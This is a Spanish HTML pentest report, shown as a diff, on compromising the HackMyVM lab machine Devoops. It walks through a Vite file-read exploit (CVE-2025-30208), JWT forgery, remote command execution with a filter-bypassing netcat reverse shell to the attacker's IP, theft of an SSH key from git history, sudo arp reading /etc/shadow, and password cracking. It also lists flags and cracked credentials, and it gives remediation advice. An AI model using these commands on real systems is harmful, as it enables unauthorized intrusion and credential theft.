-  <!-- EXECUTIVE SUMMARY -->
-  <section class="section">
-    <div class="section-label">01 — Resumen Ejecutivo</div>
-    <h2>Resumen Ejecutivo</h2>
-    <div class="card card-accent-top">
-      <p>
-        La máquina <strong style="color:#fff">Devoops</strong> (HackMyVM) expone un único servicio HTTP en el puerto <strong style="color:#fff">3000/tcp</strong> — un servidor de desarrollo <strong style="color:#fff">Vite 6.2 + Vue.js</strong> con un backend Express.js en localhost:3001. La superficie de ataque es reducida pero la cadena de explotación es completa, partiendo de una vulnerabilidad de <strong style="color:var(--red)">lectura arbitraria de ficheros</strong> (CVE-2025-30208) hasta obtener una shell como <strong style="color:#fff">root</strong>.
-      </p>
-      <p>
-        El vector principal aprovecha que el servidor Vite en modo desarrollo sirve cualquier fichero del sistema de archivos al añadir el parámetro <code>?raw??</code> a la URL. Esto expone el fichero <code>.env</code> con el secreto JWT, permitiendo forjar tokens de administrador y ejecutar comandos arbitrarios en el sistema a través del endpoint <code>/execute</code>, bypasseando el filtro de comandos mediante concatenación de cadenas.
-      </p>
-      <p>
-        La escalada a <strong style="color:#fff">root</strong> se consigue en dos saltos: recuperación de una clave SSH privada de un commit git eliminado en Gitea, y explotación del permiso <code>sudo arp</code> para leer <code>/etc/shadow</code> y crackear la contraseña de root.
-      </p>
-    </div>
-  </section>
+    <!-- MAIN -->
+    <main>
 
-  <!-- TARGET INFO -->
-  <section class="section">
-    <div class="section-label">02 — Información del Objetivo</div>
-    <h2>Información del Objetivo</h2>
-    <div class="grid-2">
-      <div class="card">
-        <h3>Detalles de la Máquina</h3>
-        <table class="info-table">
-          <tr><td>Nombre</td><td>Devoops</td></tr>
-          <tr><td>Plataforma</td><td>HackMyVM</td></tr>
-          <tr><td>IP Objetivo</td><td>10.0.2.12</td></tr>
-          <tr><td>IP Atacante</td><td>10.0.2.4 (Kali Linux)</td></tr>
-          <tr><td>OS</td><td>Alpine Linux</td></tr>
-          <tr><td>Dificultad</td><td>Fácil / Media</td></tr>
-          <tr><td>Fecha del Test</td><td>17 Marzo 2026</td></tr>
+      <!-- 1. Resumen Ejecutivo -->
+      <section class="section" id="resumen">
+        <div class="section-header">
+          <div class="section-number">1</div>
+          <h2>Resumen Ejecutivo</h2>
+        </div>
+        <p>
+          La máquina <strong style="color:#fff">Devoops</strong> (HackMyVM) expone un único servicio HTTP en el puerto <code style="font-family:monospace;color:var(--accent)">3000/tcp</code> — un servidor de desarrollo <strong style="color:#fff">Vite 6.2 + Vue.js</strong> con un backend Express.js en localhost:3001. La superficie de ataque es reducida pero la cadena de explotación es completa, partiendo de una vulnerabilidad de lectura arbitraria de ficheros (CVE-2025-30208) hasta obtener una shell como root.
+        </p>
+        <p>
+          El vector principal aprovecha que el servidor Vite en modo desarrollo sirve cualquier fichero del sistema de archivos al añadir el parámetro <code style="font-family:monospace;color:var(--accent)">?raw??</code> a la URL. Esto expone el fichero <code style="font-family:monospace;color:var(--accent)">.env</code> con el secreto JWT, permitiendo forjar tokens de administrador y ejecutar comandos arbitrarios en el sistema a través del endpoint <code style="font-family:monospace;color:var(--accent)">/execute</code>, bypasseando el filtro de comandos mediante concatenación de cadenas.
+        </p>
+        <p>
+          La escalada a root se consigue en dos saltos: recuperación de una clave SSH privada de un commit git eliminado en Gitea, y explotación del permiso <code style="font-family:monospace;color:var(--accent)">sudo arp</code> para leer <code style="font-family:monospace;color:var(--accent)">/etc/shadow</code> y crackear la contraseña de root.
+        </p>
+      </section>
+
+      <!-- 2. Reconocimiento -->
+      <section class="section" id="recon">
+        <div class="section-header">
+          <div class="section-number">2</div>
+          <h2>Reconocimiento y Escaneo de Puertos</h2>
+        </div>
+        <p>Se realizó un escaneo completo de puertos con Nmap seguido de enumeración de servicios y directorios web.</p>
+
+        <div class="code-block">
+          <div class="code-label">💻 <span>Descubrimiento y enumeración</span></div>
+          <div class="code-body">
+<span class="comment"># Fase 1: Descubrimiento de puertos</span>
+<span class="cmd">nmap</span> <span class="param">-p- --open -n -sS -T4</span> <span class="ip">10.0.2.12</span>
+<span class="highlight">→ Puerto abierto: 3000/tcp</span>
+
+<span class="comment"># Fase 2: Enumeración de servicios y versiones</span>
+<span class="cmd">nmap</span> <span class="param">-sC -sV -p 3000</span> <span class="ip">10.0.2.12</span>
+→ 3000/tcp open HTTP — Vite dev server (responde 403 con mensaje de allowedHosts)
+
+<span class="comment"># Enumeración de directorios (ffuf)</span>
+<span class="cmd">ffuf</span> <span class="param">-u</span> http://<span class="ip">10.0.2.12</span>:3000/FUZZ <span class="param">-w</span> <span class="path">/usr/share/wordlists/dirb/common.txt</span> <span class="param">-fs 414</span>
+<span class="highlight">→ /server  [200, 21764 bytes]   — server.js (código fuente)</span>
+<span class="highlight">→ /sign    [200,  189  bytes]   — endpoint de firma JWT</span>
+<span class="highlight">→ /execute [401,   48  bytes]   — ejecución de comandos (requiere auth)</span>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3>📡 Puertos Descubiertos</h3>
+          <div class="data-table">
+            <table style="width:100%;border-collapse:collapse;">
+              <thead>
+                <tr>
+                  <th style="background:var(--bg3);color:var(--text-muted);font-size:11px;text-transform:uppercase;letter-spacing:0.5px;padding:10px 14px;border:1px solid var(--border);font-weight:600;text-align:left;">Puerto</th>
+                  <th style="background:var(--bg3);color:var(--text-muted);font-size:11px;text-transform:uppercase;letter-spacing:0.5px;padding:10px 14px;border:1px solid var(--border);font-weight:600;text-align:left;">Estado</th>
+                  <th style="background:var(--bg3);color:var(--text-muted);font-size:11px;text-transform:uppercase;letter-spacing:0.5px;padding:10px 14px;border:1px solid var(--border);font-weight:600;text-align:left;">Servicio</th>
+                  <th style="background:var(--bg3);color:var(--text-muted);font-size:11px;text-transform:uppercase;letter-spacing:0.5px;padding:10px 14px;border:1px solid var(--border);font-weight:600;text-align:left;">Detalles</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr><td style="padding:10px 14px;border:1px solid var(--border);color:var(--text-dim);"><code>3000/tcp</code></td><td style="padding:10px 14px;border:1px solid var(--border);"><span class="badge" style="background:rgba(74,222,128,.1);color:var(--green);">open</span></td><td style="padding:10px 14px;border:1px solid var(--border);color:var(--text-dim);">HTTP</td><td style="padding:10px 14px;border:1px solid var(--border);color:var(--text-dim);">Vite 6.2.0 + Vue.js — Dev Server</td></tr>
+                <tr><td style="padding:10px 14px;border:1px solid var(--border);color:var(--text-dim);"><code>22/tcp</code></td><td style="padding:10px 14px;border:1px solid var(--border);"><span class="badge" style="background:rgba(100,116,139,.1);color:var(--text-muted);">loopback</span></td><td style="padding:10px 14px;border:1px solid var(--border);color:var(--text-dim);">SSH</td><td style="padding:10px 14px;border:1px solid var(--border);color:var(--text-dim);">OpenSSH — solo accesible en 127.0.0.1</td></tr>
+                <tr><td style="padding:10px 14px;border:1px solid var(--border);color:var(--text-dim);"><code>3001/tcp</code></td><td style="padding:10px 14px;border:1px solid var(--border);"><span class="badge" style="background:rgba(100,116,139,.1);color:var(--text-muted);">loopback</span></td><td style="padding:10px 14px;border:1px solid var(--border);color:var(--text-dim);">HTTP API</td><td style="padding:10px 14px;border:1px solid var(--border);color:var(--text-dim);">Express.js API — proxied por Vite</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- 3. Vulnerabilidades -->
+      <section class="section" id="vulns">
+        <div class="section-header">
+          <div class="section-number">3</div>
+          <h2>Vulnerabilidades Identificadas</h2>
+        </div>
+
+        <!-- VULN 1 -->
+        <div class="card" style="border-left: 3px solid var(--red); margin-bottom: 20px;">
+          <h3>🔴 VULN 1 — Vite Arbitrary File Read (CVE-2025-30208) <span class="badge badge-red">Crítico</span></h3>
+          <p style="color:var(--text-dim);font-size:13px;">El servidor Vite en modo desarrollo no valida correctamente las rutas de ficheros cuando se añade el sufijo <code style="font-family:monospace;color:var(--accent)">?raw??</code> a la URL. Permite leer cualquier fichero accesible por el proceso Node.js, incluyendo <code style="font-family:monospace;color:var(--accent)">/etc/passwd</code>, <code style="font-family:monospace;color:var(--accent)">.env</code> y <code style="font-family:monospace;color:var(--accent)">server.js</code>.</p>
+          <div class="code-block">
+            <div class="code-label">💻 <span>Explotación CVE-2025-30208</span></div>
+            <div class="code-body">
+<span class="comment"># Leer /etc/passwd</span>
+<span class="cmd">curl</span> 'http://<span class="ip">10.0.2.12</span>:3000/etc/passwd<span class="highlight">?raw??</span>'
+<span class="user">→ root:x:0:0:root:/root:/bin/sh</span>
+<span class="user">→ runner:x:1000:1000:::/bin/sh</span>
+<span class="user">→ hana:x:1001:100::/home/hana:/bin/sh</span>
+
+<span class="comment"># Leer .env — JWT_SECRET expuesto</span>
+<span class="cmd">curl</span> 'http://<span class="ip">10.0.2.12</span>:3000/.env<span class="highlight">?raw??</span>'
+<span class="highlight">→ JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'</span>
+<span class="highlight">→ COMMAND_FILTER='nc,python,bash,sh,ash,|,&amp;,&lt;,&gt;,ls,cat,pwd,...'</span>
+
+<span class="comment"># Leer server.js — código fuente completo del backend</span>
+<span class="cmd">curl</span> 'http://<span class="ip">10.0.2.12</span>:3000/server.js<span class="highlight">?raw??</span>'
+→ Código fuente completo del API (rutas, lógica, filtros)
+            </div>
+          </div>
+        </div>
+
+        <!-- VULN 2 -->
+        <div class="card" style="border-left: 3px solid var(--red); margin-bottom: 20px;">
+          <h3>🔴 VULN 2 — JWT Forjado + Remote Code Execution <span class="badge badge-red">Crítico</span></h3>
+          <p style="color:var(--text-dim);font-size:13px;">Con el <code style="font-family:monospace;color:var(--accent)">JWT_SECRET</code> extraído del <code style="font-family:monospace;color:var(--accent)">.env</code>, se forjó un token JWT con rol <code style="font-family:monospace;color:var(--accent)">admin</code>. El endpoint <code style="font-family:monospace;color:var(--accent)">/execute?cmd=</code> ejecuta comandos OS. El filtro de comandos se evade mediante concatenación de strings bash (<code style="font-family:monospace;color:var(--accent)">n""c</code> → nc).</p>
+          <div class="code-block">
+            <div class="code-label">💻 <span>JWT Forjado + RCE</span></div>
+            <div class="code-body">
+<span class="comment"># Generar JWT admin con el secret extraído</span>
+<span class="cmd">python3</span> -c "import jwt,time; print(jwt.encode({'uid':0,'role':'admin','iat':int(time.time())}, '<span class="highlight">2942szKG7Ev83aDviugAa6rFpKixZzZz</span>', 'HS256'))"
+→ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+
+<span class="comment"># Verificar RCE</span>
+<span class="cmd">curl</span> <span class="param">-H</span> "Authorization: Bearer &lt;TOKEN&gt;" "http://<span class="ip">10.0.2.12</span>:3000/execute?cmd=id"
+<span class="user">→ uid=1000(runner) gid=1000(runner)...</span>
+
+<span class="comment"># Reverse shell — bypass filtro con concatenación</span>
+<span class="comment"># "nc" bloqueado → "n""c" permitido; "sh" → "s""h"</span>
+<span class="cmd">curl</span> <span class="param">-H</span> "Authorization: Bearer &lt;TOKEN&gt;" "http://<span class="ip">10.0.2.12</span>:3000/execute?cmd=<span class="highlight">n%22%22c+10.0.2.4+1234+-e+s%22%22h</span>"
+<span class="highlight">→ Reverse shell recibida como runner (uid=1000)</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- VULN 3 -->
+        <div class="card" style="border-left: 3px solid var(--orange); margin-bottom: 20px;">
+          <h3>🟠 VULN 3 — Clave SSH Privada en Historial Git <span class="badge badge-orange">Alto</span></h3>
+          <p style="color:var(--text-dim);font-size:13px;">Un commit de Gitea titulado <em>"del: oops!"</em> eliminó una clave SSH privada ED25519 del usuario <code style="font-family:monospace;color:var(--accent)">hana</code>. El contenido permanece recuperable en el historial git con <code style="font-family:monospace;color:var(--accent)">git show</code>.</p>
+          <div class="code-block">
+            <div class="code-label">💻 <span>Extracción de clave SSH</span></div>
+            <div class="code-body">
+<span class="comment"># Copiar el repo bare</span>
+<span class="cmd">cp</span> <span class="param">-r</span> <span class="path">/opt/gitea/git/hana/node.git</span> /tmp/dotgit
+
+<span class="comment"># Ver commits</span>
+<span class="cmd">git</span> <span class="param">--git-dir=/tmp/dotgit</span> log --oneline
+<span class="highlight">1994a70 del: oops!</span>
+02c0f91 init: init commit
+
+<span class="comment"># Extraer la clave del commit de borrado</span>
+<span class="cmd">git</span> <span class="param">--git-dir=/tmp/dotgit</span> show 1994a70
+<span class="highlight">----- BEGIN OPENSSH PRIVATE KEY -----</span>
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMw...
+<span class="highlight">----- END OPENSSH PRIVATE KEY -----</span>
+
+<span class="comment"># Port-forward SSH y conexión como hana</span>
+<span class="cmd">socat</span> TCP-LISTEN:4444,fork TCP:127.0.0.1:22 &amp;
+<span class="cmd">ssh</span> <span class="param">-i</span> id_ed25519 <span class="user">hana</span>@<span class="ip">10.0.2.12</span> <span class="param">-p 4444</span>
+<span class="highlight">→ uid=1001(hana) — Shell obtenida ✓</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- VULN 4 -->
+        <div class="card" style="border-left: 3px solid var(--orange); margin-bottom: 20px;">
+          <h3>🟠 VULN 4 — Privilege Escalation: sudo arp <span class="badge badge-orange">Alto</span></h3>
+          <p style="color:var(--text-dim);font-size:13px;">El usuario <code style="font-family:monospace;color:var(--accent)">hana</code> puede ejecutar <code style="font-family:monospace;color:var(--accent)">/sbin/arp</code> como root sin contraseña. El comando <code style="font-family:monospace;color:var(--accent)">arp -v -f</code> permite leer <code style="font-family:monospace;color:var(--accent)">/etc/shadow</code> y obtener el hash de root, crackeado con rockyou.txt.</p>
+          <div class="code-block">
+            <div class="code-label">💻 <span>Escalada a root</span></div>
+            <div class="code-body">
+<span class="comment"># Verificar permisos sudo</span>
+<span class="cmd">sudo</span> <span class="param">-l</span>
+<span class="highlight">→ (root) NOPASSWD: /sbin/arp</span>
+
+<span class="comment"># Leer /etc/shadow con sudo arp (GTFOBins)</span>
+<span class="cmd">sudo</span> arp <span class="param">-v -f</span> <span class="path">/etc/shadow</span> 2&gt;&amp;1 | grep root
+<span class="highlight">&gt;&gt; root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKET...</span>
+
+<span class="comment"># Crackear hash con John / Hashcat</span>
+<span class="cmd">john</span> <span class="param">--format=sha512crypt --wordlist=</span><span class="path">rockyou.txt</span> hash.txt
+<span class="highlight">→ eris             (root)</span>
+
+<span class="comment"># Escalar a root</span>
+<span class="cmd">su</span> <span class="user">root</span>   → password: <span class="highlight">eris</span>
+<span class="highlight">→ uid=0(root) gid=0(root) — ROOT ✓</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- 4. Cadena de Ataque -->
+      <section class="section" id="cadena">
+        <div class="section-header">
+          <div class="section-number">4</div>
+          <h2>Cadena de Ataque Completa</h2>
+        </div>
+
+        <div class="timeline">
+          <div class="tl-item">
+            <div class="tl-dot blue"></div>
+            <div class="tl-time">Paso 1 — Reconocimiento</div>
+            <div class="tl-title">🔍 Descubrimiento de superficie de ataque</div>
+            <div class="tl-desc">Nmap revela un único puerto abierto: <code style="font-family:monospace;color:var(--accent)">3000/tcp</code>. FFuf descubre los endpoints <code style="font-family:monospace;color:var(--accent)">/server</code>, <code style="font-family:monospace;color:var(--accent)">/sign</code> y <code style="font-family:monospace;color:var(--accent)">/execute</code>. Se confirma <strong style="color:var(--text)">Vite 6.2</strong> — versión vulnerable a CVE-2025-30208.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot red"></div>
+            <div class="tl-time">Paso 2 — Lectura Arbitraria de Ficheros</div>
+            <div class="tl-title">📄 CVE-2025-30208 — Extracción de secretos</div>
+            <div class="tl-desc">Con <code style="font-family:monospace;color:var(--accent)">?raw??</code> se leen <code style="font-family:monospace;color:var(--accent)">/etc/passwd</code>, <code style="font-family:monospace;color:var(--accent)">.env</code> (JWT_SECRET) y <code style="font-family:monospace;color:var(--accent)">server.js</code> (lógica completa del backend).</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot red"></div>
+            <div class="tl-time">Paso 3 — JWT Forjado + RCE</div>
+            <div class="tl-title">🔑 Ejecución remota de comandos como runner</div>
+            <div class="tl-desc">Token JWT forjado con rol admin. Bypass del filtro de comandos con concatenación de strings bash. Reverse shell como <strong style="color:var(--accent)">runner (uid=1000)</strong>.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot purple"></div>
+            <div class="tl-time">Paso 4 — Gitea + Git History</div>
+            <div class="tl-title">🐙 Recuperación de clave SSH privada</div>
+            <div class="tl-desc">Gitea corriendo como root. Commit <em>"del: oops!"</em> contiene la clave ED25519 de <strong style="color:var(--accent)">hana</strong> en el historial.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot yellow"></div>
+            <div class="tl-time">Paso 5 — Port Forward + SSH</div>
+            <div class="tl-title">🌀 Acceso SSH como hana</div>
+            <div class="tl-desc">Socat para exponer el puerto SSH interno. Conexión con la clave ED25519 → <strong style="color:var(--accent)">hana (uid=1001)</strong>. User flag obtenida.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot orange"></div>
+            <div class="tl-time">Paso 6 — GTFOBins: sudo arp</div>
+            <div class="tl-title">⚡ Lectura de /etc/shadow y crackeo</div>
+            <div class="tl-desc"><code style="font-family:monospace;color:var(--accent)">arp -v -f /etc/shadow</code> como root. Hash SHA-512 crackeado → contraseña: <strong style="color:var(--red)">eris</strong>.</div>
+          </div>
+          <div class="tl-item">
+            <div class="tl-dot"></div>
+            <div class="tl-time">Paso 7 — Root</div>
+            <div class="tl-title">👑 Acceso total al sistema</div>
+            <div class="tl-desc"><code style="font-family:monospace;color:var(--accent)">su root</code> con la contraseña eris. Shell como <strong style="color:var(--accent)">root (uid=0)</strong>. Root flag obtenida.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- 5. Flags -->
+      <section class="section" id="flags">
+        <div class="section-header">
+          <div class="section-number">5</div>
+          <h2>Flags y Evidencias</h2>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+          <div class="flag-card">
+            <span class="flag-icon">🚩</span>
+            <div>
+              <div class="flag-label">User Flag</div>
+              <div class="flag-user">hana @ /home/hana/user.flag</div>
+              <span class="flag-value">flag{03d0e150ae9fc686a827b41e1969d497}</span>
+            </div>
+          </div>
+          <div class="flag-card">
+            <span class="flag-icon">👑</span>
+            <div>
+              <div class="flag-label">Root Flag</div>
+              <div class="flag-user">root @ /root/root.flag</div>
+              <span class="flag-value">flag{a834296543f4c2990909ce1c56becfba}</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- 6. Credenciales -->
+      <section class="section" id="creds">
+        <div class="section-header">
+          <div class="section-number">6</div>
+          <h2>Credenciales Comprometidas</h2>
+        </div>
+
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Usuario</th>
+              <th>Contraseña / Clave</th>
+              <th>Método</th>
+              <th>Acceso</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>runner</code></td>
+              <td style="color:var(--orange);font-family:monospace;">— (RCE directo)</td>
+              <td><span class="badge badge-purple">JWT Forjado + RCE</span></td>
+              <td>Reverse shell</td>
+            </tr>
+            <tr>
+              <td><code>hana</code></td>
+              <td style="color:var(--orange);font-family:monospace;">id_ed25519 (SSH key)</td>
+              <td><span class="badge badge-purple">Git History</span></td>
+              <td>SSH port 4444 (forward)</td>
+            </tr>
+            <tr>
+              <td><code>root</code></td>
+              <td style="color:var(--orange);font-family:monospace;">eris</td>
+              <td><span class="badge badge-purple">shadow + JtR</span></td>
+              <td>su / SSH directo</td>
+            </tr>
+            <tr>
+              <td><code>JWT Secret</code></td>
+              <td style="color:var(--orange);font-family:monospace;">2942szKG7Ev83aDviugAa6rFpKixZzZz</td>
+              <td><span class="badge badge-purple">Vite File Read</span></td>
+              <td>Forja de tokens</td>
+            </tr>
+            <tr>
+              <td><code>gitea / hana</code></td>
+              <td style="color:var(--orange);font-family:monospace;">saki</td>
+              <td><span class="badge badge-purple">Nota en root.flag</span></td>
+              <td>Gitea web UI</td>
+            </tr>
+          </tbody>
         </table>
-      </div>
-      <div class="card">
-        <h3>Stack Tecnológico</h3>
-        <table class="info-table">
-          <tr><td>Web Server</td><td>Vite 6.2.0 + Express.js</td></tr>
-          <tr><td>Framework</td><td>Vue.js (frontend)</td></tr>
-          <tr><td>Runtime</td><td>Node.js</td></tr>
-          <tr><td>Auth</td><td>JWT (HS256)</td></tr>
-          <tr><td>VCS</td><td>Gitea (git)</td></tr>
-          <tr><td>SSH</td><td>OpenSSH (localhost:22)</td></tr>
-          <tr><td>MAC</td><td>08:00:27:89:9A:A3 (VirtualBox)</td></tr>
+      </section>
+
+      <!-- 7. MITRE ATT&CK -->
+      <section class="section" id="mitre">
+        <div class="section-header">
+          <div class="section-number">7</div>
+          <h2>Mapeo MITRE ATT&CK</h2>
+        </div>
+
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Técnica</th>
+              <th>Fase</th>
+              <th>Evidencia</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>T1190</code></td>
+              <td>Exploit Public-Facing Application</td>
+              <td><span class="badge badge-red">Acceso Inicial</span></td>
+              <td>CVE-2025-30208 — Vite Arbitrary File Read</td>
+            </tr>
+            <tr>
+              <td><code>T1552.001</code></td>
+              <td>Unsecured Credentials: In Files</td>
+              <td><span class="badge badge-orange">Recolección</span></td>
+              <td>JWT_SECRET en .env, COMMAND_FILTER expuesto</td>
+            </tr>
+            <tr>
+              <td><code>T1059.004</code></td>
+              <td>Command and Scripting: Unix Shell</td>
+              <td><span class="badge badge-orange">Ejecución</span></td>
+              <td>RCE via /execute con JWT forjado</td>
+            </tr>
+            <tr>
+              <td><code>T1552.004</code></td>
+              <td>Private Keys</td>
+              <td><span class="badge badge-purple">Acceso Credencial</span></td>
+              <td>Clave ED25519 de hana en historial git</td>
+            </tr>
+            <tr>
+              <td><code>T1548.003</code></td>
+              <td>Abuse Elevation Control: Sudo</td>
+              <td><span class="badge badge-red">Escalada</span></td>
+              <td>sudo arp para leer /etc/shadow (GTFOBins)</td>
+            </tr>
+            <tr>
+              <td><code>T1110.002</code></td>
+              <td>Brute Force: Password Cracking</td>
+              <td><span class="badge badge-yellow">Cracking</span></td>
+              <td>SHA-512crypt hash crackeado con rockyou.txt</td>
+            </tr>
+          </tbody>
         </table>
-      </div>
-    </div>
-  </section>
+      </section>
 
-  <!-- PORT SCAN -->
-  <section class="section">
-    <div class="section-label">03 — Reconocimiento</div>
-    <h2>Reconocimiento y Escaneo de Puertos</h2>
-    <p>Se realizó un escaneo completo de puertos con Nmap seguido de enumeración de servicios y directorios web.</p>
+      <!-- 8. Remediación -->
+      <section class="section" id="hardening">
+        <div class="section-header">
+          <div class="section-number">8</div>
+          <h2>Recomendaciones de Remediación</h2>
+        </div>
 
-    <div class="code-block" style="margin-bottom:20px">
-      <div class="code-bar">
-        <span class="code-lang">bash</span>
-        <div class="code-dots"><span class="code-dot cd-r"></span><span class="code-dot cd-y"></span><span class="code-dot cd-g"></span></div>
-      </div>
-      <pre><span class="m"># Fase 1: Descubrimiento de puertos</span>
-<span class="c">nmap -p- --open -n -sS -T4 10.0.2.12</span>
-<span class="s">→ Puerto abierto: 3000/tcp</span>
-
-<span class="m"># Fase 2: Enumeración de servicios y versiones</span>
-<span class="c">nmap -sC -sV -p 3000 10.0.2.12</span>
-<span class="s">→ 3000/tcp open  HTTP — Vite dev server (responde 403 con mensaje de allowedHosts)</span>
-
-<span class="m"># Enumeración de directorios (ffuf)</span>
-<span class="c">ffuf -u http://10.0.2.12:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 414</span>
-<span class="s">→ /server  [200, 21764 bytes]   — server.js (código fuente)</span>
-<span class="s">→ /sign    [200,  189  bytes]   — endpoint de firma JWT</span>
-<span class="s">→ /execute [401,   48  bytes]   — ejecución de comandos (requiere auth)</span></pre>
-    </div>
-
-    <div class="card">
-      <table class="port-table">
-        <thead>
-          <tr>
-            <th>Puerto</th>
-            <th>Estado</th>
-            <th>Servicio</th>
-            <th>Versión / Detalles</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td><span class="port-num">3000/tcp</span></td>
-            <td><span class="port-state">open</span></td>
-            <td>HTTP</td>
-            <td>Vite 6.2.0 + Vue.js — Dev Server — Express backend en 127.0.0.1:3001</td>
-          </tr>
-          <tr>
-            <td><span class="port-num">22/tcp</span></td>
-            <td><span class="port-state" style="background:rgba(100,116,139,.1);border-color:rgba(100,116,139,.2);color:var(--muted)">loopback</span></td>
-            <td>SSH</td>
-            <td>OpenSSH — solo accesible en 127.0.0.1 (requiere port forwarding)</td>
-          </tr>
-          <tr>
-            <td><span class="port-num">3001/tcp</span></td>
-            <td><span class="port-state" style="background:rgba(100,116,139,.1);border-color:rgba(100,116,139,.2);color:var(--muted)">loopback</span></td>
-            <td>HTTP API</td>
-            <td>Express.js API Server — solo accesible en ::1 (proxied por Vite)</td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-  </section>
-
-  <!-- VULNERABILITIES -->
-  <section class="section">
-    <div class="section-label">04 — Vulnerabilidades Identificadas</div>
-    <h2>Vulnerabilidades Identificadas</h2>
-
-    <!-- VULN 1 -->
-    <div class="vuln-card sev-critical">
-      <div class="vuln-header">
-        <div class="vuln-title-group">
-          <div class="vuln-number">1</div>
-          <div>
-            <div class="vuln-name">Vite Arbitrary File Read</div>
-            <div class="vuln-cve">CVE-2025-30208 — Vite &lt;= 6.2.2</div>
+        <div class="rec-grid">
+          <div class="rec-card">
+            <div class="rec-title">🚫 No exponer Vite en modo dev</div>
+            <div class="rec-body">Actualizar Vite a ≥ 6.2.3 (fix de CVE-2025-30208). Nunca ejecutar <code style="font-family:monospace;color:var(--accent)">vite dev</code> en entornos accesibles desde la red. Usar builds de producción.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">🔑 Proteger secretos del .env</div>
+            <div class="rec-body">Usar variables de entorno del sistema, servicios de secretos (Vault, AWS Secrets Manager). Nunca exponer <code style="font-family:monospace;color:var(--accent)">.env</code> en el docroot.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">🧹 Limpiar historial git</div>
+            <div class="rec-body">Usar <code style="font-family:monospace;color:var(--accent)">git filter-repo</code> o BFG Repo-Cleaner para eliminar ficheros sensibles. Implementar pre-commit hooks con detect-secrets.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">🛡️ Restringir permisos sudo</div>
+            <div class="rec-body">Eliminar el permiso <code style="font-family:monospace;color:var(--accent)">(root) NOPASSWD: /sbin/arp</code>. Auditar todos los permisos sudo. Consultar GTFOBins para identificar binarios peligrosos.</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">🔒 Mejorar filtrado de comandos</div>
+            <div class="rec-body">El filtro basado en blacklist es trivialmente evadible. Reemplazar por allowlist estricto. Considerar sandbox (seccomp, AppArmor, contenedores).</div>
+          </div>
+          <div class="rec-card">
+            <div class="rec-title">🌐 Segmentar servicios internos</div>
+            <div class="rec-body">SSH y API backend en loopback no es suficiente si se obtiene RCE. Usar autenticación adicional y segmentación de red real con firewalls.</div>
           </div>
         </div>
-        <span class="sev-badge critical">● Crítico</span>
-      </div>
-      <div class="vuln-body">
-        <div class="vuln-grid">
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Componente afectado</div>
-            <div class="vuln-meta-value">Vite Dev Server — modo desarrollo</div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Vector</div>
-            <div class="vuln-meta-value">HTTP — parámetro <code>?raw??</code></div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Impacto</div>
-            <div class="vuln-meta-value">Lectura arbitraria de ficheros del sistema (root del filesystem)</div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Archivos expuestos</div>
-            <div class="vuln-meta-value"><code>/etc/passwd</code>, <code>.env</code>, <code>server.js</code></div>
-          </div>
-        </div>
-        <p>El servidor Vite en modo desarrollo (<code>vite dev</code>) no valida correctamente las rutas de ficheros cuando se añade el sufijo <code>?raw??</code> a la URL. Esto permite a cualquier cliente sin autenticación leer cualquier fichero accesible por el proceso de Node.js, incluyendo ficheros fuera del directorio de trabajo.</p>
-        <div class="code-block">
-          <div class="code-bar"><span class="code-lang">bash — Explotación</span><div class="code-dots"><span class="code-dot cd-r"></span><span class="code-dot cd-y"></span><span class="code-dot cd-g"></span></div></div>
-          <pre><span class="m"># Leer /etc/passwd</span>
-<span class="c">curl 'http://10.0.2.12:3000/etc/passwd?raw??'</span>
-<span class="s">→ root:x:0:0:root:/root:/bin/sh</span>
-<span class="s">→ runner:x:1000:1000:::/bin/sh</span>
-<span class="s">→ hana:x:1001:100::/home/hana:/bin/sh</span>
+      </section>
 
-<span class="m"># Leer .env — JWT_SECRET expuesto</span>
-<span class="c">curl 'http://10.0.2.12:3000/.env?raw??'</span>
-<span class="s">→ JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'</span>
-<span class="s">→ COMMAND_FILTER='nc,python,bash,sh,ash,|,&amp;,&lt;,&gt;,ls,cat,pwd,head,tail,grep,xxd'</span>
+    </main>
 
-<span class="m"># Leer server.js — código fuente del backend</span>
-<span class="c">curl 'http://10.0.2.12:3000/server.js?raw??'</span>
-<span class="s">→ Código fuente completo del API (rutas, lógica de autenticación, filtros)</span></pre>
-        </div>
-      </div>
-    </div>
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
 
-    <!-- VULN 2 -->
-    <div class="vuln-card sev-critical">
-      <div class="vuln-header">
-        <div class="vuln-title-group">
-          <div class="vuln-number">2</div>
-          <div>
